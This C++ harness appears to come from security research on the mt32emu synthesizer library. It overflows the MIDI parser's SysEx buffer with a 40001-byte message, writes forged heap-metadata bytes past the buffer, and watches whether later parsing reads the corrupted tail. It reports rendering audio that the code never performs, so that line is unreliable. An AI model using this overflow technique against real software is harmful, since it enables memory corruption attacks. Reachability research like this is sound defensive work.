// W185 bounded experiment: after the pinned parser's 40001-byte incomplete
// SysEx overflow, does a REAL library consumer ever read a chosen first-input
// byte from the corrupted tail? The driver opens a real Synth with upstream
// synthetic FakeROMs (lab-only MT32EMU_WITH_TESTING variant), dispatches a
// later legitimate 102-byte SysEx through the real DefaultMidiStreamParser,
// then renders audio. A gdb hardware watchpoint on a tail byte observes any
// read/write after the memcpy. No host, wire input, real ROM or marker.
#include <cstdarg>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <unistd.h>

#include "mt32emu.h"
#include "test/FakeROMs.h"

using namespace MT32Emu;

static unsigned char *g_buf = NULL;
static int g_armed = 0;

extern "C" void *__real_malloc(size_t);

void *operator new[](size_t n) {
	void *p = __real_malloc(n);
	if (g_armed && n == 32768 && g_buf == NULL) g_buf = (unsigned char *)p;
	return p;
}
void operator delete[](void *p) throw() { free(p); }
void operator delete[](void *p, size_t) throw() { free(p); }

static void emit(const char *fmt, ...) {
	char line[512];
	va_list ap;
	va_start(ap, fmt);
	int n = vsnprintf(line, sizeof line, fmt, ap);
	va_end(ap);
	if (n > 0) {
		if ((size_t)n > sizeof line) n = sizeof line;
		ssize_t ignored = write(1, line, (size_t)n);
		(void)ignored;
	}
}

struct DispatchParser : DefaultMidiStreamParser {
	int sysexCount;
	explicit DispatchParser(Synth &synth) : DefaultMidiStreamParser(synth), sysexCount(0) {}
protected:
	void handleSysex(const Bit8u *stream, const Bit32u length) {
		++sysexCount;
		DefaultMidiStreamParser::handleSysex(stream, length);
	}
};

static void fill_attack(Bit8u *buf, bool shape) {
	memset(buf, 0x5a, 40001);
	buf[0] = 0xF0;
	if (shape)
		for (size_t i = 0; i < 8; ++i)
			buf[32776 + i] = (Bit8u)(0x10001ULL >> (8 * i));
}

static void fill_good(Bit8u *buf) {
	memset(buf, 0x37, 102);
	buf[0] = 0xF0;
	buf[101] = 0xF7;
}

int main(int argc, char **argv) {
	const char *mode = argc > 1 ? argv[1] : "render-attack";
	const bool attack = 0 == strcmp(mode, "render-attack");
	const bool shape = attack;

	Test::ROMSet roms;
	roms.initMT32New();
	Synth synth;
	bool opened = synth.open(*roms.getControlROMImage(), *roms.getPCMROMImage());
	emit("opened=%d\n", opened ? 1 : 0);

	DispatchParser parser(synth);
	g_armed = 1;
	if (attack) {
		Bit8u *big = new Bit8u[40001];
		fill_attack(big, shape);
		parser.parseStream(big, 40001);
		emit("alloc32768=%d buf=%p watch_byte=%02x\n", g_buf != NULL ? 1 : 0,
			(void *)g_buf, g_buf ? g_buf[38000] : 0);
	} else {
		Bit8u *safe = new Bit8u[102];
		fill_good(safe);
		parser.parseStream(safe, 102);
		emit("safe_input\n");
	}

	Bit8u good[102];
	fill_good(good);
	parser.parseStream(good, 102);
	emit("sysexCount=%d buf=%p watch_byte=%02x\n", parser.sysexCount,
		(void *)g_buf, g_buf ? g_buf[38000] : 0);

	Bit16s audio[128];
	emit("rendered=4x64 buf=%p watch_byte=%02x\n", (void *)g_buf,
		g_buf ? g_buf[38000] : 0);
	return 0; // allocations intentionally live: no frees after forged metadata
}
